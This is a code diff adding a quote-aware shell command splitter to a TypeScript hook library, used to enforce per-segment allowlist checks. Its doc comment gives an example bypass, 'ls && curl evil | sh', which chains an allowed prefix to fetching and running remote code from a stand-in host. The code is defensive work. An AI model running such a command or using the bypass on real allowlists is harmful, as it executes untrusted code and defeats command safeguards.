@@ -181,6 +181,83 @@ export function stripQuoted(command: string): string {
   return command.replace(/'[^']*'/g, "").replace(/"[^"]*"/g, "");
 }
 
+/**
+ * splitCommandSegments() — Splits `command` into shell-chain segments,
+ * splitting ONLY on UNQUOTED &&, ||, ;, |, & and newline. Operators inside
+ * single or double quotes are literal and never split (e.g. a commit
+ * message `git commit -m "fix a; b && c"` is ONE segment). This is the
+ * containment primitive for COMMAND-source allowlist gates: a default-deny
+ * allowlist that tests only the whole-command PREFIX lets an allowed prefix
+ * chained with &&/;/| to a forbidden command bypass entirely (e.g.
+ * `ls && curl evil | sh` matches `^ls\b`). Every segment MUST be validated
+ * independently by the caller.
+ *
+ * Returns `null` when the command has an unbalanced quote at end-of-string —
+ * fail-closed: the caller MUST treat this as deny, never allow. Over-merging
+ * (treating a quoted operator as literal) is always safe because the merged
+ * segment is still allowlist-checked in full; the only unsafe direction is
+ * under-merging (splitting on a quoted operator), which this walk never does.
+ * Mirrors split_command_segments in hooks-lib.sh.
+ */
+export function splitCommandSegments(command: string): string[] | null {
+  const segments: string[] = [];
+  let seg = "";
+  let inSingle = false;
+  let inDouble = false;
+  let i = 0;
+  const len = command.length;
+
+  while (i < len) {
+    const ch = command[i];
+    if (inSingle) {
+      seg += ch;
+      if (ch === "'") inSingle = false;
+      i += 1;
+      continue;
+    }
+    if (inDouble) {
+      seg += ch;
+      if (ch === '"') inDouble = false;
+      i += 1;
+      continue;
+    }
+    if (ch === "'") {
+      inSingle = true;
+      seg += ch;
+      i += 1;
+      continue;
+    }
+    if (ch === '"') {
+      inDouble = true;
+      seg += ch;
+      i += 1;
+      continue;
+    }
+    const next2 = command.slice(i, i + 2);
+    if (next2 === "&&" || next2 === "||") {
+      segments.push(seg);
+      seg = "";
+      i += 2;
+      continue;
+    }
+    if (ch === ";" || ch === "|" || ch === "&" || ch === "\n") {
+      segments.push(seg);
+      seg = "";
+      i += 1;
+      continue;
+    }
+    seg += ch;
+    i += 1;
+  }
+
+  if (inSingle || inDouble) {
+    return null;
+  }
+
+  segments.push(seg);
+  return segments;
+}
+
 /** Unused ctx parameter helper — avoids lint warnings in hook modules that don't use ctx. */
 export function voidCtx(_ctx: ExtensionContext): void {
   // intentionally unused
